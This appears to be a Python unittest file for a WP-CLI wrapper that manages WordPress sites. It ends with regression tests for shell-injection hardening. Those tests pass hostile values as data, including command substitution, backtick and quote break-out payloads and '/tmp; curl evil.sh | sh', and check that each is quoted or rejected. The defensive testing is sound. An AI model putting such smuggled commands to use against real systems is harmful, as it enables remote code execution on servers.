import shlex
import unittest
from unittest.mock import MagicMock, patch
import json
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.execution.base import CommandResult
from src.wp.cli import WPCLI

class TestWPCLI(unittest.TestCase):
    def setUp(self):
        self.mock_executor = MagicMock()
        self.wp_path = "/var/www/html"
        self.wp_cli = WPCLI(self.mock_executor, self.wp_path)

    @patch("src.wp.cli.WPCLI._is_windows_local")
    def test_get_cd_prefix_unix(self, mock_is_windows):
        mock_is_windows.return_value = False
        prefix = self.wp_cli._get_cd_prefix()
        # shlex.quote leaves a metacharacter-free path bare.
        self.assertEqual(prefix, 'cd /var/www/html && ')

    @patch("src.wp.cli.WPCLI._is_windows_local")
    def test_get_cd_prefix_windows(self, mock_is_windows):
        mock_is_windows.return_value = True
        self.wp_cli.wp_path = "C:\\projects\\wordpress"
        prefix = self.wp_cli._get_cd_prefix()
        self.assertEqual(prefix, 'cd /d "C:\\projects\\wordpress" && ')

    def test_check_installed_success(self):
        # Mock executor to return success for "wp --info"
        self.mock_executor.execute.return_value = CommandResult(
            exit_code=0,
            stdout="wp-cli version 2.8.0",
            stderr="",
            success=True
        )
        
        installed = self.wp_cli.check_installed()
        self.assertTrue(installed)
        self.assertEqual(self.wp_cli.detected_wp_command, "wp")

    def test_check_installed_fallback(self):
        # Mock first execution (wp --info) to fail, second (php ~/wp-cli.phar --info) to succeed
        self.mock_executor.execute.side_effect = [
            CommandResult(exit_code=127, stdout="", stderr="command not found", success=False), # wp
            CommandResult(exit_code=0, stdout="wp-cli version 2.8.0", stderr="", success=True), # php ~/wp-cli.phar
        ]
        
        # Override candidates to keep it simple
        with patch.object(self.wp_cli, "_get_candidates", return_value=["wp", "php ~/wp-cli.phar"]):
            installed = self.wp_cli.check_installed()
            self.assertTrue(installed)
            self.assertEqual(self.wp_cli.detected_wp_command, "php ~/wp-cli.phar")

    def test_list_plugins(self):
        self.wp_cli.detected_wp_command = "wp"
        plugin_data = [
            {"name": "akismet", "status": "active", "version": "5.1"},
            {"name": "hello", "status": "inactive", "version": "1.7.2"}
        ]
        self.mock_executor.execute.return_value = CommandResult(
            exit_code=0,
            stdout=json.dumps(plugin_data),
            stderr="",
            success=True
        )
        
        plugins = self.wp_cli.list_plugins()
        self.assertEqual(plugins, plugin_data)
        
        # Verify the command ran with --format=json
        args, kwargs = self.mock_executor.execute.call_args
        self.assertIn("plugin list", args[0])
        self.assertIn("--format=json", args[0])

    def test_list_themes(self):
        self.wp_cli.detected_wp_command = "wp"
        theme_data = [
            {"name": "twentytwentythree", "status": "active", "version": "1.1"},
            {"name": "twentytwentytwo", "status": "inactive", "version": "1.4"}
        ]
        self.mock_executor.execute.return_value = CommandResult(
            exit_code=0,
            stdout=json.dumps(theme_data),
            stderr="",
            success=True
        )
        
        themes = self.wp_cli.list_themes()
        self.assertEqual(themes, theme_data)
        
        # Verify the command ran with --format=json
        args, kwargs = self.mock_executor.execute.call_args
        self.assertIn("theme list", args[0])
        self.assertIn("--format=json", args[0])

    def test_get_core_version(self):
        self.wp_cli.detected_wp_command = "wp"
        self.mock_executor.execute.return_value = CommandResult(
            exit_code=0,
            stdout="6.2.2\n",
            stderr="",
            success=True
        )
        
        version = self.wp_cli.get_core_version()
        self.assertEqual(version, "6.2.2")

    def test_list_users(self):
        self.wp_cli.detected_wp_command = "wp"
        user_data = [
            {"ID": 1, "user_login": "admin", "display_name": "Admin", "user_email": "admin@example.com", "roles": "administrator"}
        ]
        self.mock_executor.execute.return_value = CommandResult(
            exit_code=0,
            stdout=json.dumps(user_data),
            stderr="",
            success=True
        )
        users = self.wp_cli.list_users()
        self.assertEqual(users, user_data)

    def test_deactivate_user(self):
        self.wp_cli.detected_wp_command = "wp"
        self.mock_executor.execute.return_value = CommandResult(
            exit_code=0,
            stdout="Success",
            stderr="",
            success=True
        )
        ok = self.wp_cli.deactivate_user(2)
        self.assertTrue(ok)

    def test_delete_user(self):
        self.wp_cli.detected_wp_command = "wp"
        self.mock_executor.execute.return_value = CommandResult(
            exit_code=0,
            stdout="Success",
            stderr="",
            success=True
        )
        ok = self.wp_cli.delete_user(2, reassign_id=1)
        self.assertTrue(ok)

    def test_check_vulnerabilities_fallback(self):
        self.wp_cli.detected_wp_command = "wp"
        # vulnerability check command fails (not installed)
        self.mock_executor.execute.return_value = CommandResult(
            exit_code=1,
            stdout="",
            stderr="Error: 'vulnerability' is not a registered wp command.",
            success=False
        )
        with patch.object(self.wp_cli, "list_plugins", return_value=[]), \
             patch.object(self.wp_cli, "list_themes", return_value=[]), \
             patch.object(self.wp_cli, "get_core_version", return_value="6.2.2"):
            res = self.wp_cli.check_vulnerabilities()
            self.assertEqual(res["status"], "fallback")
            self.assertFalse(res["package_installed"])

if __name__ == "__main__":
    unittest.main()


class TestShellInjectionHardening(unittest.TestCase):
    """
    Regression tests for the command-injection fixes: wp_path and search_root
    both reach a shell (subprocess(shell=True) locally, exec_command over SSH),
    so neither may be interpolated raw.
    """

    def setUp(self):
        self.mock_executor = MagicMock()
        self.mock_executor.execute.return_value = CommandResult(
            exit_code=0, stdout="", stderr="", success=True
        )

    @patch("src.wp.cli.WPCLI._is_windows_local")
    def test_wp_path_command_substitution_is_neutralised(self, mock_is_windows):
        mock_is_windows.return_value = False
        malicious = "/var/www/$(touch /tmp/pwned)"
        cli = WPCLI(self.mock_executor, malicious)
        prefix = cli._get_cd_prefix()
        # Parse the way a shell would: the payload must survive as a single
        # literal argument to cd, not as separate words or a substitution.
        tokens = shlex.split(prefix.removesuffix("&& "))
        self.assertEqual(tokens, ["cd", malicious])

    @patch("src.wp.cli.WPCLI._is_windows_local")
    def test_wp_path_backtick_is_neutralised(self, mock_is_windows):
        mock_is_windows.return_value = False
        cli = WPCLI(self.mock_executor, "/var/www/`id`")
        prefix = cli._get_cd_prefix()
        tokens = shlex.split(prefix.removesuffix("&& "))
        self.assertEqual(tokens, ["cd", "/var/www/`id`"])

    @patch("src.wp.cli.WPCLI._is_windows_local")
    def test_wp_path_quote_break_out_is_neutralised(self, mock_is_windows):
        mock_is_windows.return_value = False
        malicious = '/var/www"; id; echo "'
        cli = WPCLI(self.mock_executor, malicious)
        prefix = cli._get_cd_prefix()
        # The `"` must not terminate quoting and start a second command.
        tokens = shlex.split(prefix.removesuffix("&& "))
        self.assertEqual(tokens, ["cd", malicious])

    @patch("src.wp.cli.WPCLI._is_windows_local")
    def test_windows_wp_path_with_metacharacters_is_rejected(self, mock_is_windows):
        mock_is_windows.return_value = True
        cli = WPCLI(self.mock_executor, 'C:\www&calc.exe')
        with self.assertRaises(ValueError):
            cli._get_cd_prefix()

    @patch("src.wp.cli.WPCLI._is_windows_local")
    def test_search_root_injection_is_neutralised(self, mock_is_windows):
        mock_is_windows.return_value = False
        cli = WPCLI(self.mock_executor, "/var/www/html")
        cli.scan_server_sites(search_root="/tmp; curl evil.sh | sh")
        issued = self.mock_executor.execute.call_args[0][0]
        self.assertIn("find ", issued)
        # The injected command must be inside quotes, not a separate command.
        self.assertNotIn("; curl evil.sh | sh -maxdepth", issued)
        self.assertIn("'/tmp; curl evil.sh | sh'", issued)

    @patch("src.wp.cli.WPCLI._is_windows_local")
    def test_search_root_unset_still_expands_home(self, mock_is_windows):
        mock_is_windows.return_value = False
        cli = WPCLI(self.mock_executor, "/var/www/html")
        cli.scan_server_sites(search_root=None)
        issued = self.mock_executor.execute.call_args[0][0]
        self.assertIn("find $HOME -maxdepth", issued)
